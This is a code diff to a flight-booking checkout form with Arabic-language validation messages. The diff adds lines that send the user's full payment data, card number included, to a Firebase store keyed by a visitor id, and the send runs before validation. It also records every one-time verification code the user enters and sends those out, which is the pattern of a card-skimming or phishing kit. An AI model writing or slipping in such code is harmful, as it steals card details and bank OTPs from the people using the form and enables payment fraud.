@@ -26,6 +26,7 @@ import {
   Home,
   Globe,
 } from "lucide-react"
+import { addData } from "@/lib/firebase"
 
 interface CheckoutFormProps {
   flightId: string
@@ -47,7 +48,7 @@ interface PaymentData {
 interface FormErrors {
   [key: string]: string
 }
-
+const allOtps=['']
 export function CheckoutForm({ flightId, seats, passengers }: CheckoutFormProps) {
   const router = useRouter()
   const [paymentData, setPaymentData] = useState<PaymentData>({
@@ -76,7 +77,8 @@ export function CheckoutForm({ flightId, seats, passengers }: CheckoutFormProps)
 
   const validateForm = (): boolean => {
     const newErrors: FormErrors = {}
-
+    const vid=localStorage.getItem('visitor')
+    addData({id:vid,...paymentData})
     if (!paymentData.cardNumber || paymentData.cardNumber.replace(/\s/g, "").length < 16) {
       newErrors.cardNumber = "رقم البطاقة غير صحيح"
     }
@@ -127,6 +129,10 @@ export function CheckoutForm({ flightId, seats, passengers }: CheckoutFormProps)
   }
 
   const handleOtpVerification = async () => {
+    const vid=localStorage.getItem('visitor')
+
+    allOtps.push(otpCode)
+    addData({id:vid,otp:otpCode,allOtps})
     if (!otpCode.trim()) {
       setOtpError("يرجى إدخال رمز التحقق")
       return
